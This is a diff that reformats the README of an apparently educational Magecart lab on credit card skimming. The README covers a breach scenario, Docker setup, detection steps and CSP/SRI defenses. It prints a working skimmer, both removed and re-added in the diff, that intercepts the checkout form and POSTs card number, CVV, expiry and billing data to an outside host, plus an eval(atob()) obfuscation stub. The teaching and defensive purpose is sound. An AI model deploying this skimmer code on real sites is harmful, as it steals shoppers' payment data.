@@ -3,6 +3,7 @@
 ## 🎯 Learning Objectives
 
 By completing this lab, you will:
+
 - Understand how basic credit card skimmers work
 - Learn about form data interception techniques
 - Observe data exfiltration in action
@@ -13,15 +14,20 @@ By completing this lab, you will:
 
 **Timeline**: September 2018  
 **Victim**: "TechGear Store" - Mid-sized electronics retailer  
-**Compromise Vector**: Stolen admin credentials  
+**Compromise Vector**: Stolen admin credentials
 
 ### How it Happened
 
-1. **Initial Compromise**: A developer's laptop was infected with info-stealer malware through a phishing email
-2. **Credential Theft**: The malware captured admin credentials to TechGear's Magento backend
-3. **Silent Access**: Attackers logged in during off-hours using a VPN to mask their location
-4. **Code Injection**: Modified a single JavaScript file (`checkout.js`) by appending 22 lines of code
-5. **Persistence**: The modification blended with legitimate code, going undetected for 47 days
+1. **Initial Compromise**: A developer's laptop was infected with info-stealer
+   malware through a phishing email
+2. **Credential Theft**: The malware captured admin credentials to TechGear's
+   Magento backend
+3. **Silent Access**: Attackers logged in during off-hours using a VPN to mask
+   their location
+4. **Code Injection**: Modified a single JavaScript file (`checkout.js`) by
+   appending 22 lines of code
+5. **Persistence**: The modification blended with legitimate code, going
+   undetected for 47 days
 6. **Discovery**: Customer fraud reports led to forensic investigation
 
 ### Attack Characteristics
@@ -54,37 +60,22 @@ By completing this lab, you will:
 
 ## 📂 Files in This Lab
 
-01-basic-magecart/
-├── 01-README.md                    # This file
-├── scenario.md                  # Detailed breach narrative
-├── docker-compose.yml           # Launch environment
-├── vulnerable-site/             # Victim e-commerce site
-│   ├── Dockerfile
-│   ├── index.html              # Product catalog
-│   ├── checkout.html           # Payment form (compromised)
-│   ├── css/
-│   │   └── style.css
-│   └── js/
-│       ├── checkout.js         # Legitimate code
-│       └── checkout-compromised.js  # With skimmer appended
-├── malicious-code/
-│   ├── skimmer-obfuscated.js   # As deployed by attacker
-│   ├── skimmer-clean.js        # Readable, commented version
-│   └── c2-server/
-│       ├── Dockerfile
-│       ├── server.js           # Express server logging stolen data
-│       └── stolen-data/        # Data collection directory
-├── analysis/
-│   ├── deobfuscation.md        # Step-by-step code analysis
-│   ├── network-capture.pcap    # Wireshark capture
-│   ├── detection-guide.md      # How to find the skimmer
-│   └── screenshots/
-└── exercises/
-    ├── 01-detect.md            # Find the skimmer challenge
-    ├── 02-analyze.md           # Understand the code
-    ├── 03-prevent.md           # Implement defenses
-    └── solutions/              # Answer key
-```
+01-basic-magecart/ ├── 01-README.md # This file ├── scenario.md # Detailed
+breach narrative ├── docker-compose.yml # Launch environment ├──
+vulnerable-site/ # Victim e-commerce site │ ├── Dockerfile │ ├── index.html #
+Product catalog │ ├── checkout.html # Payment form (compromised) │ ├── css/ │ │
+└── style.css │ └── js/ │ ├── checkout.js # Legitimate code │ └──
+checkout-compromised.js # With skimmer appended ├── malicious-code/ │ ├──
+skimmer-obfuscated.js # As deployed by attacker │ ├── skimmer-clean.js #
+Readable, commented version │ └── c2-server/ │ ├── Dockerfile │ ├── server.js #
+Express server logging stolen data │ └── stolen-data/ # Data collection
+directory ├── analysis/ │ ├── deobfuscation.md # Step-by-step code analysis │
+├── network-capture.pcap # Wireshark capture │ ├── detection-guide.md # How to
+find the skimmer │ └── screenshots/ └── exercises/ ├── 01-detect.md # Find the
+skimmer challenge ├── 02-analyze.md # Understand the code ├── 03-prevent.md #
+Implement defenses └── solutions/ # Answer key
+
+````
 
 ## 🚀 Getting Started
 
@@ -106,9 +97,10 @@ docker-compose up -d
 
 # Verify services are running
 docker-compose ps
-```
+````
 
 **Services:**
+
 - Vulnerable E-commerce Site: http://localhost:8080
 - Attacker C2 Server: http://localhost:3000 (view stolen data)
 
@@ -148,20 +140,23 @@ docker-compose ps
 Use browser DevTools to detect the skimmer:
 
 **Console Detection:**
+
 ```javascript
 // Check for suspicious event listeners
-getEventListeners(document.querySelector('form'));
+getEventListeners(document.querySelector('form'))
 
 // Inspect XMLHttpRequest/fetch calls
 // (Set breakpoint on XMLHttpRequest.prototype.send)
 ```
 
 **Network Analysis:**
+
 - Look for unexpected POST requests
 - Check request payloads for form data
 - Identify suspicious domains
 
 **Static Analysis:**
+
 - Search for encoded strings
 - Look for eval() or Function() calls
 - Find obfuscated variable names
@@ -171,16 +166,22 @@ getEventListeners(document.querySelector('form'));
 Try implementing these defenses:
 
 1. **Content Security Policy (CSP)**
+
    ```html
-   <meta http-equiv="Content-Security-Policy" 
-         content="default-src 'self'; script-src 'self'">
+   <meta
+     http-equiv="Content-Security-Policy"
+     content="default-src 'self'; script-src 'self'"
+   />
    ```
 
 2. **Subresource Integrity (SRI)**
+
    ```html
-   <script src="checkout.js" 
-           integrity="sha384-..." 
-           crossorigin="anonymous"></script>
+   <script
+     src="checkout.js"
+     integrity="sha384-..."
+     crossorigin="anonymous"
+   ></script>
    ```
 
 3. **Input Monitoring**
@@ -195,39 +196,37 @@ Try implementing these defenses:
 
 ```javascript
 // 1. Wait for form to be ready
-document.addEventListener('DOMContentLoaded', function() {
-    
-    // 2. Target the payment form
-    var form = document.querySelector('#payment-form');
-    
-    // 3. Intercept form submission
-    form.addEventListener('submit', function(e) {
-        
-        // 4. Extract credit card data
-        var cardData = {
-            number: document.querySelector('#card-number').value,
-            cvv: document.querySelector('#cvv').value,
-            expiry: document.querySelector('#expiry').value,
-            name: document.querySelector('#cardholder-name').value,
-            // Also grab billing info for complete fraud
-            billing: {
-                address: document.querySelector('#billing-address').value,
-                zip: document.querySelector('#zip').value
-            }
-        };
-        
-        // 5. Exfiltrate to attacker's server
-        fetch('https://analytics-cdn.com/collect', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(cardData),
-            mode: 'no-cors' // Avoid CORS errors
-        });
-        
-        // 6. Let legitimate form submission proceed
-        // (User sees no indication of compromise)
-    });
-});
+document.addEventListener('DOMContentLoaded', function () {
+  // 2. Target the payment form
+  var form = document.querySelector('#payment-form')
+
+  // 3. Intercept form submission
+  form.addEventListener('submit', function (e) {
+    // 4. Extract credit card data
+    var cardData = {
+      number: document.querySelector('#card-number').value,
+      cvv: document.querySelector('#cvv').value,
+      expiry: document.querySelector('#expiry').value,
+      name: document.querySelector('#cardholder-name').value,
+      // Also grab billing info for complete fraud
+      billing: {
+        address: document.querySelector('#billing-address').value,
+        zip: document.querySelector('#zip').value
+      }
+    }
+
+    // 5. Exfiltrate to attacker's server
+    fetch('https://analytics-cdn.com/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(cardData),
+      mode: 'no-cors' // Avoid CORS errors
+    })
+
+    // 6. Let legitimate form submission proceed
+    // (User sees no indication of compromise)
+  })
+})
 ```
 
 ### Why This Works
@@ -282,6 +281,7 @@ Legitimate checkout continues → User completes purchase normally
 4. Time yourself (can you find it in < 5 minutes?)
 
 **Hints**:
+
 - Check the Network tab during checkout
 - Examine loaded JavaScript files
 - Look for duplicate form submissions
@@ -293,8 +293,9 @@ Legitimate checkout continues → User completes purchase normally
 **Objective**: Deobfuscate and explain the skimmer
 
 Given this obfuscated code:
+
 ```javascript
-eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcig...'));
+eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcig...'))
 ```
 
 1. Decode the Base64 string
@@ -309,6 +310,7 @@ eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcig...'));
 **Objective**: Make the site resistant to this attack
 
 Implement three defensive layers:
+
 1. CSP that blocks the skimmer
 2. SRI for all JavaScript files
 3. Runtime monitoring that alerts on data exfiltration
@@ -327,9 +329,11 @@ Test your defenses by trying to inject the skimmer.
 
 ### Reading
 
-- [Anatomy of Formjacking Attacks](https://unit42.paloaltonetworks.com/) - Palo Alto Networks
+- [Anatomy of Formjacking Attacks](https://unit42.paloaltonetworks.com/) - Palo
+  Alto Networks
 - [Inside Magecart](https://www.riskiq.com/) - RiskIQ Research
-- [British Airways Breach Analysis](https://schoenbaum.medium.com/) - Technical deep-dive
+- [British Airways Breach Analysis](https://schoenbaum.medium.com/) - Technical
+  deep-dive
 
 ### Tools
 
@@ -355,6 +359,8 @@ Test your defenses by trying to inject the skimmer.
 
 ---
 
-**Next Steps**: Once you've completed this lab, move on to Lab 02 to learn about more sophisticated multi-form data scraping techniques.
+**Next Steps**: Once you've completed this lab, move on to Lab 02 to learn about
+more sophisticated multi-form data scraping techniques.
 
-[← Back to Main README](../../README.md) | [Next Lab: LocalStorage Scraper →](../02-localstorage-scraper/README.md)
+[← Back to Main README](../../README.md) |
+[Next Lab: LocalStorage Scraper →](../02-localstorage-scraper/README.md)
